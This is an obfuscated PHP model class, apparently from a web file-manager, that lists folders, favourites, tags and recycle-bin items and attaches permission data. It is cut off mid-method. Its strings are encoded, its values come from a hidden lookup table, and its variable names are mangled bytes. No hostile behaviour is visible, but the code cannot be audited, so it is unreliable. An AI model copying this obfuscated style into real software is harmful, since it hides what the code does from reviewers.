a“¦°ÕŠ¨é: class SourceListModel extends ModelBase { protected $tableName = "\151\157\137\163\157\165\x72\x63\x65"; protected $tableMeta = array("\164\141\x62\x6c\145\116\141\155\x65" => "\x69\157\137\x73\157\165\x72\x63\145\137\155\145\x74\141", "\155\x65\x74\x61\106\x69\145\154\144" => "\163\157\165\x72\143\145\x49\x44"); protected $dataAuto = array(array("\x6d\157\144\151\x66\171\x54\151\155\x65", "\x74\x69\x6d\x65", "\x69\156\163\145\162\x74", "\x66\x75\x6e\143\164\151\157\156"), array("\x63\162\x65\x61\164\145\124\151\x6d\145", "\164\151\x6d\x65", "\151\x6e\163\145\x72\164", "\146\x75\156\143\164\151\x6f\156"), array("\166\x69\145\x77\124\151\x6d\x65", "\164\151\x6d\x65", "\151\x6e\163\x65\162\x74", "\146\x75\x6e\143\x74\x69\157\x6e")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($ÑŞÑ¬Í¿) { return $this->listSource(array($_SERVER[¤·²È‰º][409] => $ÑŞÑ¬Í¿)); } public function typeName($›–ˆ¦ş…) { static $¨¶ú°Ê = array(self::TYPE_SYSTEM => "\163\171\163\x74\145\155", self::TYPE_USER => "\x75\x73\145\x72", self::TYPE_GROUP => "\x67\162\x6f\165\160"); return $¨¶ú°Ê[$›–ˆ¦ş… . $_SERVER[¤·²È‰º][12]]; } public function sourceListInfo($àûÜ‹¨, $ÂøÔ¶º = false) { $ôŠÔ¡êõ =& $_SERVER[¤·²È‰º]; $àûÜ‹¨ = $àûÜ‹¨ ? $àûÜ‹¨ : array(); $àûÜ‹¨ = array_filter(array_unique($àûÜ‹¨)); if (!$àûÜ‹¨) { return array(); } $œ““Šò÷ = $this->where(array($ôŠÔ¡êõ[410] => array($ôŠÔ¡êõ[7], $àûÜ‹¨)))->select(); $this->_listDataApply($œ““Šò÷, $ÂøÔ¶º); return array_to_keyvalue($œ““Šò÷, $ôŠÔ¡êõ[410]); } public function pathInfoFilter(&$ìûŞ¿ÁÁ) { $Ÿ´Ê•Õ =& $_SERVER[¤·²È‰º]; static $·ÚÂóÒÔ = false; static $Úğì•‡¡ = false; static $¾›¶Éİ = false; if (!$·ÚÂóÒÔ) { $Ğè»÷•ç = $Ÿ´Ê•Õ[411]; $Ğè»÷•ç .= $Ÿ´Ê•Õ[412]; $Ğè»÷•ç .= $Ÿ´Ê•Õ[413]; $Ş…Š‘Ö = $Ÿ´Ê•Õ[414]; $åÈ•ïãì = explode($Ÿ´Ê•Õ[60], $Ş…Š‘Ö); $·ÚÂóÒÔ = explode($Ÿ´Ê•Õ[60], $Ğè»÷•ç); $Úğì•‡¡ = array(); foreach ($·ÚÂóÒÔ as $Üî¿Ô’) { if (in_array($Üî¿Ô’, $åÈ•ïãì)) { continue; } $Úğì•‡¡[] = $Üî¿Ô’; } $¾›¶Éİ = explode($Ÿ´Ê•Õ[60], $Ÿ´Ê•Õ[415]); } foreach ($¾›¶Éİ as $­´å¿†ë) { if (isset($ìûŞ¿ÁÁ[$­´å¿†ë])) { $ìûŞ¿ÁÁ[$­´å¿†ë] = intval($ìûŞ¿ÁÁ[$­´å¿†ë]); } } $ìûŞ¿ÁÁ[$Ÿ´Ê•Õ[94]] = $Ÿ´Ê•Õ[416] . $ìûŞ¿ÁÁ[$Ÿ´Ê•Õ[410]] . $Ÿ´Ê•Õ[417]; $ìûŞ¿ÁÁ[$Ÿ´Ê•Õ[43]] = $ìûŞ¿ÁÁ[$Ÿ´Ê•Õ[418]] == 1 ? $Ÿ´Ê•Õ[85] : $Ÿ´Ê•Õ[209]; $ìûŞ¿ÁÁ[$Ÿ´Ê•Õ[419]] = $this->typeName($ìûŞ¿ÁÁ[$Ÿ´Ê•Õ[419]]); if ($ìûŞ¿ÁÁ[$Ÿ´Ê•Õ[418]] != 1) { $ìûŞ¿ÁÁ[$Ÿ´Ê•Õ[184]] = $ìûŞ¿ÁÁ[$Ÿ´Ê•Õ[420]]; unset($ìûŞ¿ÁÁ[$Ÿ´Ê•Õ[420]]); } $ãˆ×‹ó– = $·ÚÂóÒÔ; if (isset($ìûŞ¿ÁÁ[$Ÿ´Ê•Õ[421]]) && $ìûŞ¿ÁÁ[$Ÿ´Ê•Õ[421]][$Ÿ´Ê•Õ[422]] == -1) { $ãˆ×‹ó– = $Úğì•‡¡; } $ìûŞ¿ÁÁ = array_field_key($ìûŞ¿ÁÁ, $ãˆ×‹ó–); return $ìûŞ¿ÁÁ; } public function listUserFav() { $Ô»Îä¥ =& $_SERVER[¤·²È‰º]; $ôº¹ß‡ê = Model($Ô»Îä¥[423])->listData(); $÷‰ß÷Ñ¼ = array_filter_by_field($ôº¹ß‡ê, $Ô»Îä¥[43], $Ô»Îä¥[424]); $÷‰ß÷Ñ¼ = array_to_keyvalue($÷‰ß÷Ñ¼, $Ô»Îä¥[12], $Ô»Îä¥[94]); if ($÷‰ß÷Ñ¼) { $İöÓœìŒ = $this->listSource(array($Ô»Îä¥[425] => array($Ô»Îä¥[426], $÷‰ß÷Ñ¼))); } $İöÓœìŒ = array_to_keyvalue($İöÓœìŒ[$Ô»Îä¥[378]], $Ô»Îä¥[410]); foreach ($ôº¹ß‡ê as &$şûèĞÍ…) { $şûèĞÍ… = array($Ô»Îä¥[427] => $şûèĞÍ…[$Ô»Îä¥[407]], $Ô»Îä¥[428] => $şûèĞÍ…[$Ô»Îä¥[42]], $Ô»Îä¥[429] => $şûèĞÍ…[$Ô»Îä¥[94]], $Ô»Îä¥[430] => $şûèĞÍ…[$Ô»Îä¥[43]], $Ô»Îä¥[431] => $şûèĞÍ…[$Ô»Îä¥[210]], $Ô»Îä¥[432] => $şûèĞÍ…[$Ô»Îä¥[95]]); if ($şûèĞÍ…[$Ô»Îä¥[43]] == $Ô»Îä¥[424] && $İöÓœìŒ[$şûèĞÍ…[$Ô»Îä¥[94]]]) { $şûèĞÍ…[$Ô»Îä¥[96]] = $İöÓœìŒ[$şûèĞÍ…[$Ô»Îä¥[94]]]; } } unset($şûèĞÍ…); return $ôº¹ß‡ê; } public function listUserTag($ÌØ¾´í±) { $ŒÚÎËáé =& $_SERVER[¤·²È‰º]; if ($ÌØ¾´í± && !is_array($ÌØ¾´í±)) { $ÌØ¾´í± = array($ÌØ¾´í±); } $¬ƒóĞ€ = Model($ŒÚÎËáé[433])->listData(); $ê õÕæ” = array(); $­ÕÆµ‹‡ = array(); foreach ($¬ƒóĞ€ as $Ê¼æœÀ) { $¬“Šë¤ = $Ê¼æœÀ[$ŒÚÎËáé[94]]; if (!$¬“Šë¤) { continue; } if (!isset($­ÕÆµ‹‡[$¬“Šë¤])) { $­ÕÆµ‹‡[$¬“Šë¤] = array(); } $­ÕÆµ‹‡[$¬“Šë¤][] = $Ê¼æœÀ[$ŒÚÎËáé[434]]; $ê õÕæ”[$Ê¼æœÀ[$ŒÚÎËáé[94]]] = $Ê¼æœÀ; } $º¥ââşƒ = array(); $ÚÏŒãôÏ = array(); $õ©­ÎŒÅ = array(); foreach ($­ÕÆµ‹‡ as $›‰İü™Í => $‡¸òû–¼) { $È–’ÒÎ“ = !0; if (!$ÌØ¾´í±) { $º¥ââşƒ[] = $›‰İü™Í; continue; } foreach ($ÌØ¾´í± as $úª­×³´) { if (!in_array($úª­×³´, $‡¸òû–¼)) { $È–’ÒÎ“ = !1; break; } } if (!$È–’ÒÎ“) { continue; } if (!is_numeric($›‰İü™Í)) { $¥€•Ú§ç = $ê õÕæ”[$›‰İü™Í]; $ò¯ï“ = array($ŒÚÎËáé[42] => $¥€•Ú§ç[$ŒÚÎËáé[42]], $ŒÚÎËáé[94] => $¥€•Ú§ç[$ŒÚÎËáé[94]], $ŒÚÎËáé[43] => $¥€•Ú§ç[$ŒÚÎËáé[43]], $ŒÚÎËáé[96] => array($ŒÚÎËáé[435] => 1), $ŒÚÎËáé[211] => !0); if ($¥€•Ú§ç[$ŒÚÎËáé[43]] == $ŒÚÎËáé[209]) { $õ©­ÎŒÅ[] = $ò¯ï“; } if ($¥€•Ú§ç[$ŒÚÎËáé[43]] == $ŒÚÎËáé[85]) { $ÚÏŒãôÏ[] = $ò¯ï“; } continue; } $º¥ââşƒ[] = $›‰İü™Í; } if ($º¥ââşƒ) { $æà×úì = $this->listSource(array($ŒÚÎËáé[425] => array($ŒÚÎËáé[426], $º¥ââşƒ))); } $æà×úì = $æà×úì ? $æà×úì : array($ŒÚÎËáé[92] => array(), $ŒÚÎËáé[93] => array()); $æà×úì[$ŒÚÎËáé[92]] = array_merge($æà×úì[$ŒÚÎËáé[92]], $ÚÏŒãôÏ); $æà×úì[$ŒÚÎËáé[93]] = array_merge($æà×úì[$ŒÚÎËáé[93]], $õ©­ÎŒÅ); if (isset($æà×úì[$ŒÚÎËáé[375]]) && count($º¥ââşƒ) == $æà×úì[$ŒÚÎËáé[375]][$ŒÚÎËáé[376]]) { return $æà×úì; } $óÉ¨ = array(); $åïóö¶ = array_to_keyvalue($æà×úì[$ŒÚÎËáé[92]], $ŒÚÎËáé[12], $ŒÚÎËáé[410]); $˜ìş¦æÆ = array_to_keyvalue($æà×úì[$ŒÚÎËáé[93]], $ŒÚÎËáé[12], $ŒÚÎËáé[410]); $àùçË§Ú = array_merge($˜ìş¦æÆ, $åïóö¶); foreach ($º¥ââşƒ as $¬“Šë¤) { if (!in_array($¬“Šë¤, $àùçË§Ú)) { $óÉ¨[] = $¬“Šë¤; } } if ($óÉ¨) { Model($ŒÚÎËáé[436])->removeBySource($óÉ¨); } return $æà×úì; } public function listUserRecycle() { $’Šş«èå =& $_SERVER[¤·²È‰º]; $Ñâ¤ÒÖƒ = Model($’Šş«èå[437])->listData(); if (!$Ñâ¤ÒÖƒ) { return array(); } $¥§ê‰ = array($’Šş«èå[425] => array($’Šş«èå[426], $Ñâ¤ÒÖƒ), $’Šş«èå[438] => 1); return $this->listSource($¥§ê‰); } public function listSource($«èä·ÍÖ, $É¢×—ÇÕ = 3000, $³ÛÃıØ· = false) { $Øõ¨¿© =& $_SERVER[¤·²È‰º]; if (!isset($«èä·ÍÖ[$Øõ¨¿©[439]])) { $«èä·ÍÖ[$Øõ¨¿©[439]] = 0; } if (isset($«èä·ÍÖ[$Øõ¨¿©[440]]) && $«èä·ÍÖ[$Øõ¨¿©[440]] == $Øõ¨¿©[207]) { $«èä·ÍÖ[$Øõ¨¿©[420]] = array($Øõ¨¿©[340], $Øõ¨¿©[441]); } $ˆ“¡øä€ = $Øõ¨¿©[442]; $¾…±Ùò = $this->field($ˆ“¡øä€)->_makeOrder()->where($«èä·ÍÖ)->selectPage($É¢×—ÇÕ); $this->_listPageCheck($¾…±Ùò, $ˆ“¡øä€, $«èä·ÍÖ); $this->_listDataApply($¾…±Ùò[$Øõ¨¿©[378]], $³ÛÃıØ·); $this->_listMake($¾…±Ùò); return $¾…±Ùò; } private function _listPageCheck(&$—ÑˆÓÆà, $¹üøÂÏ–, $ôöï³ìº) { $áÈß—Ì =& $_SERVER[¤·²È‰º]; if (!is_array($—ÑˆÓÆà[$áÈß—Ì[375]])) { return; } $ è²œÖí = $—ÑˆÓÆà[$áÈß—Ì[375]]; if ($ è²œÖí[$áÈß—Ì[377]] <= 1) { return; } if ($ è²œÖí[$áÈß—Ì[376]] >= 100000) { return; } if (Model($áÈß—Ì[443])->get($áÈß—Ì[444]) != $áÈß—Ì[445]) { return; } $¹üøÂÏ– = str_replace(array($áÈß—Ì[63], $áÈß—Ì[351], $áÈß—Ì[18]), $áÈß—Ì[12], $¹üøÂÏ–); $¹üøÂÏ– = $áÈß—Ì[446] . str_replace($áÈß—Ì[60], $áÈß—Ì[447], $¹üøÂÏ–) . $áÈß—Ì[448]; $ë²Şõó¹ = $áÈß—Ì[449]; $ë²Şõó¹ = $ë²Şõó¹ . $áÈß—Ì[450]; $‡Š…»“Ã = $ è²œÖí[$áÈß—Ì[372]] * ($ è²œÖí[$áÈß—Ì[362]] - 1) . $áÈß—Ì[60] . $ è²œÖí[$áÈß—Ì[372]]; $ªÇìôä = $this->_makeOrder(!0); $ó—º‘¦ = $áÈß—Ì[446] . str_replace($áÈß—Ì[60], $áÈß—Ì[447], $ªÇìôä[0]); if (strpos($ó—º‘¦, $áÈß—Ì[451])) { $ó—º‘¦ = str_replace($áÈß—Ì[451], $áÈß—Ì[452], $ó—º‘¦); } else { $ó—º‘¦ .= $áÈß—Ì[453] . $ªÇìôä[1]; } $ı‡€øĞŞ = array(); foreach ($ôöï³ìº as $ËŞŠ¶·‚ => $ÇÍËıŞ—) { $ı‡€øĞŞ[$áÈß—Ì[446] . $ËŞŠ¶·‚] = $ÇÍËıŞ—; } $this->alias($áÈß—Ì[454])->field($¹üøÂÏ–)->limit($‡Š…»“Ã)->order($ó—º‘¦); $±ÔğÁ¿¶ = $this->join($ë²Şõó¹)->where($ı‡€øĞŞ)->select(); if ($±ÔğÁ¿¶) { $—ÑˆÓÆà[$áÈß—Ì[378]] = $±ÔğÁ¿¶; } } protected function _makeOrder($¼èéÁÁÕ = false) { $”ˆ¾õëÈ =& $_SERVER[¤·²È‰º]; $ÅËíê³ì = Model($”ˆ¾õëÈ[455])->get($”ˆ¾õëÈ[456]); $¸…ÂŸâÌ = Model($”ˆ¾õëÈ[455])->get($”ˆ¾õëÈ[457]); $Êí°·´ë = array($”ˆ¾õëÈ[458] => $”ˆ¾õëÈ[459], $”ˆ¾õëÈ[460] => $”ˆ¾õëÈ[461]); $ÕÇ¿äÅ = array($”ˆ¾õëÈ[42] => $”ˆ¾õëÈ[42], $”ˆ¾õëÈ[86] => $”ˆ¾õëÈ[86], $”ˆ¾õëÈ[184] => $”ˆ¾õëÈ[420], $”ˆ¾õëÈ[462] => $”ˆ¾õëÈ[462], $”ˆ¾õëÈ[463] => $”ˆ¾õëÈ[464], $”ˆ¾õëÈ[210] => $”ˆ¾õëÈ[210], $”ˆ¾õëÈ[95] => $”ˆ¾õëÈ[95]); $ñ´ÅñØĞ = Input::get($”ˆ¾õëÈ[465], $”ˆ¾õëÈ[7], $ÅËíê³ì, array_keys($ÕÇ¿äÅ)); $Üû¤¬² = Input::get($”ˆ¾õëÈ[466], $”ˆ¾õëÈ[7], $¸…ÂŸâÌ, array_keys($Êí°·´ë)); if (!in_array($ñ´ÅñØĞ, array_keys($ÕÇ¿äÅ))) { $ñ´ÅñØĞ = $”ˆ¾õëÈ[42]; } if (!in_array($Üû¤¬², array_keys($Êí°·´ë))) { $ñ´ÅñØĞ = $”ˆ¾õëÈ[458]; } if ($ñ´ÅñØĞ == $”ˆ¾õëÈ[42]) { } $×ù°·á = $”ˆ¾õëÈ[467] . $ÕÇ¿äÅ[$ñ´ÅñØĞ] . $”ˆ¾õëÈ[63] . $Êí°·´ë[$Üû¤¬²]; $×ù°·á = rtrim(trim($×ù°·á), $”ˆ¾õëÈ[60]); if ($¼èéÁÁÕ) { return array($×ù°·á, $Êí°·´ë[$Üû¤¬²]); } return $this->order($×ù°·á); } protected function _listDataApplyItem($Â¾°îÒ, $™í•Æ¿ = false) { $ÃÔ©•Õ¯ = array($Â¾°îÒ); $this->_listDataApply($ÃÔ©•Õ¯, $™í•Æ¿); return $ÃÔ©•Õ¯[0]; } protected function _listDataApply(&$ª¶×„Ô¦, $Ì“ú÷ˆ³ = false) { $µÁÄ´Ö =& $_SERVER[¤·²È‰º]; if (!$ª¶×„Ô¦) { $ª¶×„Ô¦ = array(); return; } $¶µ¡ø©Ö = array_to_keyvalue($ª¶×„Ô¦, $µÁÄ´Ö[12], $µÁÄ´Ö[410]); $¶µ¡ø©Ö = array_unique($¶µ¡ø©Ö); $this->_listSourceCache($ª¶×„Ô¦); if (!$Ì“ú÷ˆ³) { $this->_listAppendMeta($ª¶×„Ô¦, $¶µ¡ø©Ö); $this->_listAppendFileMeta($ª¶×„Ô¦, $¶µ¡ø©Ö); $this->_listAppendChildren($ª¶×„Ô¦, $¶µ¡ø©Ö); } $this->_listAppendPath($ª¶×„Ô¦); $this->_listAppendAuth($ª¶×„Ô¦); $this->_listAppendSourceInfo($ª¶×„Ô¦, $¶µ¡ø©Ö); $this->_listAppendUser($ª¶×„Ô¦); $this->_listFilterInfo($ª¶×„Ô¦, $Ì“ú÷ˆ³); $this->_listAppendAuthSecret($ª¶×„Ô¦); } protected function _listSourceCache($±Ï½øá©) { $Õºş÷Ì† =& $_SERVER[¤·²È‰º]; foreach ($±Ï½øá© as $ÎŒ‰Ò …) { self::$cacheSourceInfo[$Õºş÷Ì†[468] . $ÎŒ‰Ò …[$Õºş÷Ì†[410]]] = $ÎŒ‰Ò …; } } protected function _listFilterInfo(&$ğÒÀ¸»ò, $¸¬óÂÒÃ = false) { $ƒÚÒèÚ‰ =& $_SERVER[¤·²È‰º]; foreach ($ğÒÀ¸»ò as &$¨öÊñËŞ) { $¨öÊñËŞ = $this->pathInfoFilter($¨öÊñËŞ); self::$cachePathInfo[$ƒÚÒèÚ‰[469] . intval($¸¬óÂÒÃ) . $ƒÚÒèÚ‰[394] . $¨öÊñËŞ[$ƒÚÒèÚ‰[410]]] = $¨öÊñËŞ; } unset($¨öÊñËŞ); } protected function _listMake(&$©­Œòğ) { $”™€á½Ò =& $_SERVER[¤·²È‰º]; $©­Œòğ[$”™€á½Ò[92]] = array(); $©­Œòğ[$”™€á½Ò[93]] = array(); foreach ($©­Œòğ[$”™€á½Ò[378]] as $÷ÚĞ¬îÙ) { $Ë§· ü = $÷ÚĞ¬îÙ[$”™€á½Ò[418]] == 1 ? $”™€á½Ò[92] : $”™€á½Ò[93]; $©­Œòğ[$Ë§· ü][] = $÷ÚĞ¬îÙ; } unset($©­Œòğ[$”™€á½Ò[378]]); } protected function _listAppendMeta(&$¦ª„ùöî, $şµØÙÔ·) { $‡äÜË²Å =& $_SERVER[¤·²È‰º]; $™æ°±óŠ = array($‡äÜË²Å[425] => array($‡äÜË²Å[426], $şµØÙÔ·)); $íí¼òÓ = Model($‡äÜË²Å[470])->field($‡äÜË²Å[471])->where($™æ°±óŠ)->select(); if (!$íí¼òÓ) { return; } $Õæâ««½ = array($‡äÜË²Å[472], $‡äÜË²Å[473], $‡äÜË²Å[452]); $€…ĞÕÓó = array(); foreach ($íí¼òÓ as $Ñ‰¹‰‘†) { if (!isset($€…ĞÕÓó[$Ñ‰¹‰‘†[$‡äÜË²Å[410]]])) { $€…ĞÕÓó[$Ñ‰¹‰‘†[$‡äÜË²Å[410]]] = array(); } if (in_array($Ñ‰¹‰‘†[$‡äÜË²Å[104]], $Õæâ««½)) { continue; } $€…ĞÕÓó[$Ñ‰¹‰‘†[$‡äÜË²Å[410]]][$Ñ‰¹‰‘†[$‡äÜË²Å[104]]] = $Ñ‰¹‰‘†[$‡äÜË²Å[383]]; } foreach ($¦ª„ùöî as &$õº¡¦²) { $õº¡¦²[$‡äÜË²Å[474]] = !1; if (isset($€…ĞÕÓó[$õº¡¦²[$‡äÜË²Å[410]]])) { $õº¡¦²[$‡äÜË²Å[474]] = $€…ĞÕÓó[$õº¡¦²[$‡äÜË²Å[410]]]; } if ($this->fileIsLock($õº¡¦²) && $õº¡¦²[$‡äÜË²Å[421]]) { $äÜğğë¢ = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $õº¡¦²[$‡äÜË²Å[421]][$‡äÜË²Å[422]] = AuthModel::authDisable($õº¡¦²[$‡äÜË²Å[421]][$‡äÜË²Å[422]], $äÜğğë¢); $õº¡¦²[$‡äÜË²Å[421]][$‡äÜË²Å[475]][$‡äÜË²Å[421]] = $õº¡¦²[$‡äÜË²Å[421]][$‡äÜË²Å[422]]; } } unset($õº¡¦²); } protected function _listAppendFileMeta(&$ÑØĞ˜², $ğ‚÷£€’) { $õÕı¼ˆ =& $_SERVER[¤·²È‰º]; $ÜüÉàÄ¦ = array_to_keyvalue($ÑØĞ˜², $õÕı¼ˆ[12], $õÕı¼ˆ[476]); $ÜüÉàÄ¦ = array_filter(array_unique($ÜüÉàÄ¦)); if (!$ÜüÉàÄ¦) { return; } $²ºöõ’‹ = array($õÕı¼ˆ[477] => array($õÕı¼ˆ[426], $ÜüÉàÄ¦)); $ÓŒ—Šˆş = $õÕı¼ˆ[478]; $èõúî„ñ = Model($õÕı¼ˆ[479])->field($ÓŒ—Šˆş)->where($²ºöõ’‹)->select(); $èõúî„ñ = array_to_keyvalue($èõúî„ñ, $õÕı¼ˆ[476]); $Ü•¨ùà¶ = Model($õÕı¼ˆ[480])->field($õÕı¼ˆ[481])->where($²ºöõ’‹)->select(); $Ü•¨ùà¶ = $Ü•¨ùà¶ ? $Ü•¨ùà¶ : array(); $óÔÕ¡Ï´ = array(); foreach ($Ü•¨ùà¶ as $°•”•€È) { if (!isset($óÔÕ¡Ï´[$°•”•€È[$õÕı¼ˆ[476]]])) { $óÔÕ¡Ï´[$°•”•€È[$õÕı¼ˆ[476]]] = array(); } $óÔÕ¡Ï´[$°•”•€È[$õÕı¼ˆ[476]]][$°•”•€È[$õÕı¼ˆ[104]]] = $°•”•€È[$õÕı¼ˆ[383]]; } foreach ($ÑØĞ˜² as &$Ãæöºàè) { $ì¾ İ®‡ = $Ãæöºàè[$õÕı¼ˆ[476]]; if (!$ì¾ İ®‡ || !is_array($èõúî„ñ[$ì¾ İ®‡])) { continue; } $õáŠü©ö = $èõúî„ñ[$ì¾ İ®‡]; $õáŠü©ö[$õÕı¼ˆ[86]] = $Ãæöºàè[$õÕı¼ˆ[86]]; $õáŠü©ö[$õÕı¼ˆ[42]] = $Ãæöºàè[$õÕı¼ˆ[42]]; if (!isset(self::$cacheFileInfo[$õÕı¼ˆ[482] . $ì¾ İ®‡])) { self::$cacheFileInfo[$õÕı¼ˆ[482] . $ì¾ İ®‡] = array_merge(array(), $õáŠü©ö); } unset($èõúî„ñ[$ì¾ İ®‡][$õÕı¼ˆ[94]]); $»Àâøª× = is_array($óÔÕ¡Ï´[$ì¾ İ®‡]) ? $óÔÕ¡Ï´[$ì¾ İ®‡] : array(); $Ãæöºàè[$õÕı¼ˆ[180]] = array_merge($»Àâøª×, $èõúî„ñ[$ì¾ İ®‡]); if (isset($Ãæöºàè[$õÕı¼ˆ[180]][$õÕı¼ˆ[179]])) { $Ãæöºàè[$õÕı¼ˆ[179]] = json_decode($Ãæöºàè[$õÕı¼ˆ[180]][$õÕı¼ˆ[179]], !0); unset($Ãæöºàè[$õÕı¼ˆ[180]][$õÕı¼ˆ[179]]); } } unset($Ãæöºàè); } protected function _listAppendSourceInfo(&$ºÚöôª, $ÖüÎÛú) { $©ß÷ÉÂù =& $_SERVER[¤·²È‰º]; if (!defined($©ß÷ÉÂù[483])) { return; } $¸ç“ö–é = Model($©ß÷ÉÂù[484])->listData(); $î·•£Ò± = Model($©ß÷ÉÂù[433])->listData(); $ü×¢é‹À = Model($©ß÷ÉÂù[423])->listData(); $¸Ê´ÁÔÃ = Model($©ß÷ÉÂù[485])->listSimple(); $´¥õ÷ãŸ = array_to_keyvalue($¸ç“ö–é, $©ß÷ÉÂù[407]); $÷×§ß¶â = array_to_keyvalue_group($î·•£Ò±, $©ß÷ÉÂù[94], $©ß÷ÉÂù[434]); $‚Ô¶úòø = array_to_keyvalue($ü×¢é‹À, $©ß÷ÉÂù[94]); $êë§½ñÛ = array_to_keyvalue_group($¸Ê´ÁÔÃ, $©ß÷ÉÂù[410]); foreach ($ºÚöôª as &$ï²×ß•) { $ï²×ß•[$©ß÷ÉÂù[96]] = array($©ß÷ÉÂù[486] => 0, $©ß÷ÉÂù[487] => 0, $©ß÷ÉÂù[488] => 0); if (isset($‚Ô¶úòø[$ï²×ß•[$©ß÷ÉÂù[410]]])) { $ï²×ß•[$©ß÷ÉÂù[96]][$©ß÷ÉÂù[489]] = 1; $ï²×ß•[$©ß÷ÉÂù[96]][$©ß÷ÉÂù[490]] = $‚Ô¶úòø[$ï²×ß•[$©ß÷ÉÂù[410]]][$©ß÷ÉÂù[42]]; } if ($÷×§ß¶â && $´¥õ÷ãŸ && isset($÷×§ß¶â[$ï²×ß•[$©ß÷ÉÂù[410]]])) { $ï²×ß•[$©ß÷ÉÂù[96]][$©ß÷ÉÂù[491]] = array(); foreach ($÷×§ß¶â[$ï²×ß•[$©ß÷ÉÂù[410]]] as $Óìç§Õ–) { $š¨ú•ô© = $´¥õ÷ãŸ[$Óìç§Õ–]; $ï²×ß•[$©ß÷ÉÂù[96]][$©ß÷ÉÂù[491]][] = array($©ß÷ÉÂù[492] => $š¨ú•ô©[$©ß÷ÉÂù[407]], $©ß÷ÉÂù[428] => $š¨ú•ô©[$©ß÷ÉÂù[42]], $©ß÷ÉÂù[493] => $š¨ú•ô©[$©ß÷ÉÂù[494]]); } } if ($êë§½ñÛ && isset($êë§½ñÛ[$ï²×ß•[$©ß÷ÉÂù[410]]])) { $ï²×ß•[$©ß÷ÉÂù[96]][$©ß÷ÉÂù[495]] = array(); foreach ($êë§½ñÛ[$ï²×ß•[$©ß÷ÉÂù[410]]] as $õ£­‹Ä) { $ï²×ß•[$©ß÷ÉÂù[96]][$©ß÷ÉÂù[495]] = array($©ß÷ÉÂù[496] => $õ£­‹Ä[$©ß÷ÉÂù[497]], $©ß÷ÉÂù[498] => $õ£­‹Ä[$©ß÷ÉÂù[499]], $©ß÷ÉÂù[500] => $õ£­‹Ä[$©ß÷ÉÂù[410]], $©ß÷ÉÂù[501] => $õ£­‹Ä[$©ß÷ÉÂù[502]], $©ß÷ÉÂù[503] => $õ£­‹Ä[$©ß÷ÉÂù[504]], $©ß÷ÉÂù[505] => $õ£­‹Ä[$©ß÷ÉÂù[505]], $©ß÷ÉÂù[506] => $õ£­‹Ä[$©ß÷ÉÂù[506]]); } } } unset($ï²×ß•); return $ºÚöôª; } protected function _listAppendChildren(&$¾Óì•œÂ, $×´Ú™òŒ) { $àŸı˜ =& $_SERVER[¤·²È‰º]; $Æ¢¥¶•» = array(); $ú• ÉşÒ = array($àŸı˜[217] => 0, $àŸı˜[218] => 0); foreach ($¾Óì•œÂ as &$äòÚÊËæ) { if (!$äòÚÊËæ[$àŸı˜[418]]) { continue; } $Æ¢¥¶•»[] = $äòÚÊËæ[$àŸı˜[410]]; } unset($äòÚÊËæ); if (!$Æ¢¥¶•») { return; } $Ô±ô‰îí = array($àŸı˜[440] => array($àŸı˜[7], $Æ¢¥¶•»), $àŸı˜[439] => 0); $Ö˜±‡Ú = array($àŸı˜[440], $àŸı˜[418], $àŸı˜[507] => $àŸı˜[508]); $ïäò¼°Ï = $this->field($Ö˜±‡Ú)->where($Ô±ô‰îí)->group($àŸı˜[509])->select(); $§ìšãš = array(); foreach ($ïäò¼°Ï as $æÄÌöÜÅ) { $¸Ø¾ÕñÊ = $æÄÌöÜÅ[$àŸı˜[440]]; $§ŸÈ”¾í = $æÄÌöÜÅ[$àŸı˜[418]] == $àŸı˜[98] ? $àŸı˜[218] : $àŸı˜[217]; if (!isset($§ìšãš[$¸Ø¾ÕñÊ])) { $§ìšãš[$¸Ø¾ÕñÊ] = array($àŸı˜[217] => 0, $àŸı˜[218] => 0); } $§ìšãš[$¸Ø¾ÕñÊ][$§ŸÈ”¾í] += $æÄÌöÜÅ[$àŸı˜[508]]; } foreach ($¾Óì•œÂ as &$äòÚÊËæ) { if (!$äòÚÊËæ[$àŸı˜[418]]) { continue; } $°›ÔÒØœ = is_array($§ìšãš[$äòÚÊËæ[$àŸı˜[410]]]) ? $§ìšãš[$äòÚÊËæ[$àŸı˜[410]]] : $ú• ÉşÒ; $äòÚÊËæ[$àŸı˜[218]] = $°›ÔÒØœ[$àŸı˜[218]]; $äòÚÊËæ[$àŸı˜[217]] = $°›ÔÒØœ[$àŸı˜[217]]; unset($äòÚÊËæ[$àŸı˜[420]]); } unset($äòÚÊËæ); } protected function _listAppendAuth(&$‘«î±ÜÑ) { $Î®Á‰ç„ =& $_SERVER[¤·²È‰º]; if (!defined($Î®Á‰ç„[483])) { return; } $ŞàƒŞä = array(); foreach ($‘«î±ÜÑ as $ºƒÀ¿° ) { if ($ºƒÀ¿° [$Î®Á‰ç„[419]] == self::TYPE_GROUP) { $ŞàƒŞä[] = $ºƒÀ¿° [$Î®Á‰ç„[410]]; } } if (!$ŞàƒŞä) { return; } $‚ı èÌ– = array_to_keyvalue($‘«î±ÜÑ, $Î®Á‰ç„[410]); $‚”›©± = Model($Î®Á‰ç„[510])->getSourceList($ŞàƒŞä, $‚ı èÌ–); $ ËÓÇó§ = $GLOBALS[$Î®Á‰ç„[511]] == 1; foreach ($‘«î±ÜÑ as $ˆ¬èò•¦ => &$ºƒÀ¿° ) { $ºƒÀ¿° [$Î®Á‰ç„[421]] = $‚”›©±[$ºƒÀ¿° [$Î®Á‰ç„[410]]]; if (!$ºƒÀ¿° [$Î®Á‰ç„[421]] && $ºƒÀ¿° [$Î®Á‰ç„[419]] == self::TYPE_GROUP) { $ºƒÀ¿° [$Î®Á‰ç„[421]] = Action($Î®Á‰ç„[512])->pathGroupAuthMake($ºƒÀ¿° [$Î®Á‰ç„[513]]); if (!$ºƒÀ¿° [$Î®Á‰ç„[421]] && !$ ËÓÇó§) { $ºƒÀ¿° [$Î®Á‰ç„[212]] = !1; $ºƒÀ¿° [$Î®Á‰ç„[211]] = !1; } } if ($ºƒÀ¿° [$Î®Á‰ç„[421]]) { $ºƒÀ¿° [$Î®Á‰ç„[212]] = AuthModel::authCheckEdit($ºƒÀ¿° [$Î®Á‰ç„[421]][$Î®Á‰ç„[422]]); $ºƒÀ¿° [$Î®Á‰ç„[211]] = AuthModel::authCheckView($ºƒÀ¿° [$Î®Á‰ç„[421]][$Î®Á‰ç„[422]]); } $this->groupPathDisplay($ºƒÀ¿° ); 